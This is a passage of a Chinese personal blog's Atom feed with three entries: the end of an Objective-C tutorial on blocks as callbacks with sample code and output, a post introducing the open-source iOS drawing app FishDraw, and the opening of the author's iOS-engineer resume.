<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> method(BlockType block) &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"事件A"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"事件B"</span>);</div><div class="line">    block();</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"事件C"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"事件D"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"事件E"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"=================="</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">@autoreleasepool</span> &#123;</div><div class="line">        method(^ &#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"事件X1"</span>);</div><div class="line">        &#125;);</div><div class="line">        method(^ &#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"事件X2"</span>);</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件A</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件B</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件X1</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件C</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件D</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件E</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] ==================</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件A</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件B</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件X2</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件C</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件D</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] 事件E</div><div class="line">block_回调[<span class="number">34821</span>:<span class="number">2210234</span>] ==================</div></pre></td></tr></table></figure>
<p>现在你可以看出回调的意思——执行自己的一段代码，再去掉别人实现的一段代码，再回到自己的代码。</p>
<p>block实现的回调非常方便使用。</p>
<p>在JAVA著名的Spring框架中，提出了面向切面编程。也就是利用回调，向代码中插入切面，拦截、过滤、织入自己想添加的逻辑。切面编程可以实现种种不可思议的编程，在每一个方法前、方法后、或者方法中的任意位置，织入你想添加逻辑。这种结合了责任链设计模式的优秀的编程思想被迅速广泛使用。</p>
<p>iOS在加入了block后同样被广泛使用，所以掌握好block是iOS学习之路不可少的一部分。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#99;&#x6f;&#100;&#101;&#x72;&#102;&#x69;&#115;&#104;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#109;">&#99;&#x6f;&#100;&#101;&#x72;&#102;&#x69;&#115;&#104;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实几乎天天都在用block吧，却没有仔细研究过，这次也当给自己补课啦&lt;/p&gt;
&lt;h1 id=&quot;block&quot;&gt;&lt;a href=&quot;#block&quot; class=&quot;headerlink&quot; title=&quot;block&quot;&gt;&lt;/a&gt;block&lt;/h1&gt;&lt;p&gt;这几个基本概念会帮助你理解block&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;block是一种变量类型&lt;/li&gt;
&lt;li&gt;block是C级别的语法和运行机制&lt;/li&gt;
&lt;li&gt;block除了包含可执行代码以外，还包含了与堆、栈内存绑定的变量。所以Block对象包含着一组状态数据，这些数据在程序执行时用于对行为产生影响&lt;/li&gt;
&lt;li&gt;block的意义在于不仅包含了回调期间的代码，又包含了执行期间需要的数据，并且支持多线程&lt;/li&gt;
&lt;li&gt;block类似于C语言的函数指针，不要看的太难&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;block的定义和基本结构&quot;&gt;&lt;a href=&quot;#block的定义和基本结构&quot; class=&quot;headerlink&quot; title=&quot;block的定义和基本结构&quot;&gt;&lt;/a&gt;block的定义和基本结构&lt;/h1&gt;&lt;p&gt;放上@传智如意大师的解说图&lt;br&gt;&lt;img src=&quot;http://img.my.csdn.net/uploads/201208/07/1344323584_7609.png&quot; alt=&quot;block定义&quot;&gt;&lt;/p&gt;
&lt;p&gt;现在看是不是有点麻烦？直接上例子，小鱼喜欢把详细的解释放在代码里（程序员风格），相信你一定瞬间弄懂&lt;/p&gt;
&lt;p&gt;建立了一个command项目，列出了各种block的定义&lt;/p&gt;
&lt;figure class=&quot;highlight objc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; * argv[]) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;@autoreleasepool&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 1.1 无参数无返回值-完整写法 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (^myBlock1)() = ^()&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;无参数无返回值的block&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        myBlock1();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 1.2 无参数无返回值-简写 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (^myBlock1_simple)() = ^&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;无参数无返回值的block的简写&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        myBlock1_simple();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 2.1 有参数无返回值 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/**&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;         * void (^block变量名)(参数类型及个数) = ^(形参列表)&amp;#123;代码块&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;         */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (^myBlock2)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) = ^(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; y)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;有参数无返回值，两数和为:%d&quot;&lt;/span&gt;, x + y);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        myBlock2(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 2.2 对block变量重新赋值 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        myBlock2 = ^(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; y) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;对block变量重新赋值，两数差为:%d&quot;&lt;/span&gt;, x - y);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        myBlock2(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 3 无参数有返回值 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;NSString&lt;/span&gt; *(^myBlock3)() = ^ ()&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;@&quot;无参数有返回值&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;%@&quot;&lt;/span&gt;, myBlock3());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/********* 4 有参数有返回值 *********/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (^myBlock4)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) = ^(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; y) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; x + y;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; result = myBlock4(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;NSLog&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;@&quot;有参数有返回值，两数和为:%d&quot;&lt;/span&gt;, result);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——一直忘了分享的FishDraw</title>
    <link href="http://zhoulingyu.com/2015/11/18/iOS%E2%80%94%E2%80%94%E4%B8%80%E7%9B%B4%E5%BF%98%E4%BA%86%E5%88%86%E4%BA%AB%E7%9A%84FishDraw/"/>
    <id>http://zhoulingyu.com/2015/11/18/iOS——一直忘了分享的FishDraw/</id>
    <published>2015-11-18T10:21:18.000Z</published>
    <updated>2016-08-05T06:23:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FishDraw"><a href="#FishDraw" class="headerlink" title="FishDraw"></a>FishDraw</h1><p>很早以前写的一个CAD画图板，早早上传到github，博客忘了拿出来分享。可以绘制图形并且缩放、移动图形。<br>有详细的<a href="https://github.com/summertian4/iOS-FishDraw/blob/master/FishDraw/FishDraw.pdf" target="_blank" rel="external">UML结构图</a>。</p>
<p><a href="https://github.com/summertian4/iOS-FishDraw" target="_blank" rel="external">Github链接</a>：<a href="https://github.com/summertian4/iOS-FishDraw" target="_blank" rel="external">https://github.com/summertian4/iOS-FishDraw</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>iOS-FishDraw是一个简单的画图app。</p>
<p>动图展示:</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-FishDraw-show.gif" alt="FishDraw效果演示"></p>
<a id="more"></a>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ol>
<li>绘制椭圆、矩形、圆形等基本图形</li>
<li>选择即将绘制图形的颜色</li>
<li>缩放图形</li>
<li>移动图形</li>
</ol>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><ol>
<li><a href="https://github.com/summertian4/iOS-FishDraw/blob/master/FishDraw/FishDraw.pdf" target="_blank" rel="external">UML图PDF</a></li>
</ol>
<h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><ol>
<li>2015年8月19日  第一次提交源码</li>
<li>2015年9月23日  加入屏幕适配</li>
<li>2015年11月18日 更新UI</li>
</ol>
<h1 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h1><ol>
<li>绘制自由直线</li>
<li>绘制空心图形</li>
</ol>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#111;&#100;&#101;&#114;&#102;&#105;&#115;&#x68;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#x6d;">&#99;&#111;&#100;&#101;&#114;&#102;&#105;&#115;&#x68;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;FishDraw&quot;&gt;&lt;a href=&quot;#FishDraw&quot; class=&quot;headerlink&quot; title=&quot;FishDraw&quot;&gt;&lt;/a&gt;FishDraw&lt;/h1&gt;&lt;p&gt;很早以前写的一个CAD画图板，早早上传到github，博客忘了拿出来分享。可以绘制图形并且缩放、移动图形。&lt;br&gt;有详细的&lt;a href=&quot;https://github.com/summertian4/iOS-FishDraw/blob/master/FishDraw/FishDraw.pdf&quot;&gt;UML结构图&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/summertian4/iOS-FishDraw&quot;&gt;Github链接&lt;/a&gt;：&lt;a href=&quot;https://github.com/summertian4/iOS-FishDraw&quot;&gt;https://github.com/summertian4/iOS-FishDraw&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;iOS-FishDraw是一个简单的画图app。&lt;/p&gt;
&lt;p&gt;动图展示:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-FishDraw-show.gif&quot; alt=&quot;FishDraw效果演示&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>简历·周凌宇·iOS工程师</title>
    <link href="http://zhoulingyu.com/2015/11/17/%E7%AE%80%E5%8E%86%C2%B7%E5%91%A8%E5%87%8C%E5%AE%87%C2%B7iOS%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
    <id>http://zhoulingyu.com/2015/11/17/简历·周凌宇·iOS工程师/</id>
    <published>2015-11-17T11:45:12.000Z</published>
    <updated>2016-06-08T01:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简历·周凌宇"><a href="#简历·周凌宇" class="headerlink" title="简历·周凌宇"></a><center>简历·周凌宇</center></h1><p><center><br><img src="http://7xnrog.com1.z0.glb.clouddn.com/resume_avatar.png-w245" alt=""><br></center><br><br></p>
<h2 id="基本资料"><a href="#基本资料" class="headerlink" title="基本资料"></a>基本资料</h2><blockquote>
<ul>
<li>姓名：周凌宇</li>
<li>联系电话：18717819045</li>
<li>邮箱：<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#99;&#x6f;&#100;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#54;&#51;&#46;&#99;&#x6f;&#109;">&#99;&#x6f;&#100;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#54;&#51;&#46;&#99;&#x6f;&#109;</a></li>
<li>博客：<a href="http://zhoulingyu.com">http://zhoulingyu.com</a></li>
<li>github：<a href="https://github.com/summertian4" target="_blank" rel="external">https://github.com/summertian4</a></li>
<li>应聘职位：iOS工程师</li>
<li>工作经验：两年</li>
</ul>
</blockquote>
<h2 id="教育背景"><a href="#教育背景" class="headerlink" title="教育背景"></a>教育背景</h2><blockquote>
<ul>
<li>毕业院校：安庆师范学院</li>
<li>院系：计算机与信息学院</li>
<li>专业：物联网工程专业</li>
<li>年级：大四毕业</li>
</ul>
</blockquote>
<h2 id="技能"><a href="#技能" class="headerlink" title="技能"></a>技能</h2><blockquote>
<ul>
<li>熟练掌握OC</li>
<li>熟练掌握UI，网络，数据库，XML/JSON解析</li>
<li>熟练掌握Autolayout、Masonry</li>
<li>熟练掌握全代码UI</li>
<li>熟练掌握、sqlite、mysql、SQL Server数据库</li>
<li>熟练掌握客户端MVC开发模式</li>
<li>简单掌握MVVM开发模式</li>
<li>简单掌握ReactiveCocoa开发</li>
<li>会使用git、svn合作开发</li>
<li>习惯用UML分析项目架构和项目逻辑</li>
<li>对OOD/OOP有深刻理解，具有良好的代码编写习惯</li>
<li>有实际的项目开发经验</li>
</ul>
</blockquote>
<h2 id="其他技能"><a href="#其他技能" class="headerlink" title="其他技能"></a>其他技能</h2><blockquote>
<ul>
<li><strong>两年的JAVA服务器开发经验：</strong><ul>
<li>熟练掌握几大框架及其MVC开发模式：<ul>
<li>SpringMVC、Struts2、Struts1</li>
<li>hibernate、ibatis、DbUtils</li>
<li>Spring</li>
</ul>
</li>
</ul>
</li>
<li>熟悉Tomcat服务器</li>
<li><strong>前端技能：</strong><ul>
<li>HTML：简单掌握HTML</li>
<li>js：简单掌握js、jquery、bootstrap</li>
</ul>
</li>
<li><strong>数据库技能：</strong>熟练掌握sqlite、mysql、SQL Server</li>
</ul>
</blockquote>
<h2 id="项目经验"><a href="#项目经验" class="headerlink" title="项目经验"></a>项目经验</h2><blockquote>
<h3 id="iOS项目"><a href="#iOS项目" class="headerlink" title="iOS项目"></a><span style="color:#00aa99">iOS项目</span></h3><h4 id="上海深屹网络科技——小店宝（Customer端）-iOS客户端"><a href="#上海深屹网络科技——小店宝（Customer端）-iOS客户端" class="headerlink" title="上海深屹网络科技——小店宝（Customer端） iOS客户端"></a>上海深屹网络科技——小店宝（Customer端） iOS客户端</h4><ul>
<li><strong>项目地址：</strong><a href="https://appsto.re/cn/sFit8.i" target="_blank" rel="external">小店宝-惠享身边的美物好店</a></li>
<li><strong>项目简介：</strong>小店宝主要为线下中高端小店做有质量、有品质的推广。Customer端主要为客户提供精品店铺的推荐，每日10点提供店铺福利的报名、中奖和福利预约。</li>
<li><strong>公司简介：</strong>A轮初创公司，做线下购物平台索引，类似于中高端小店的大众点评。目前汇集了上海、北京两个城市在内的8000家店铺。技术团队由前堆糖CTO带领。</li>
<li><strong>公司主页：</strong><a href="www.ushopal.com">www.ushopal.com</a></li>
<li><strong>项目难点：</strong>功能业务繁多；原生和HTML页面无缝衔接；线上修改BUG；页面几乎都需要灵活配置，考虑低版本和向后的兼容；兼容iOS7</li>
<li><strong>负责部分：</strong><ul>
<li>『搜索』页面UI及逻辑实现</li>
<li>『找宝贝』页面的性能优化</li>
<li>『我的订单』页UI及逻辑实现</li>
<li>『关于』页面、『设置』页面的UI和逻辑实现</li>
<li>店铺福利报名、中奖、预约的UI和逻辑实现</li>
<li>CDN取图规则的封装和应用</li>
<li>城市选择、切换的逻辑实现</li>
<li>BUG监控和JSPatch线上补丁（监控主要使用Fabric和Bugtags）</li>
<li>对TZImagePickerController优化（为了兼容iOS7同时支持iCloud照片选择）</li>
<li>Scheme定义和封装</li>
</ul>
</li>
<li><strong>涉及技术：</strong><ul>
<li>MVC开发模式</li>
<li>Scheme实现原生和HTML页面的无缝跳转</li>
<li>纯代码UI编写</li>
<li>CDN取图规则适配</li>
<li>3D Touch实现预览</li>
<li>JSPatch线上打补丁修复BUG</li>
<li>服务器灵活配置UI</li>
</ul>
</li>
</ul>
<h4 id="上海深屹网络科技——小店宝（Professional端）-iOS客户端"><a href="#上海深屹网络科技——小店宝（Professional端）-iOS客户端" class="headerlink" title="上海深屹网络科技——小店宝（Professional端） iOS客户端"></a>上海深屹网络科技——小店宝（Professional端） iOS客户端</h4><ul>
<li><strong>项目地址：</strong><a href="https://appsto.re/cn/d7P07.i" target="_blank" rel="external">小店宝 - 实体门店销售管理神器</a></li>
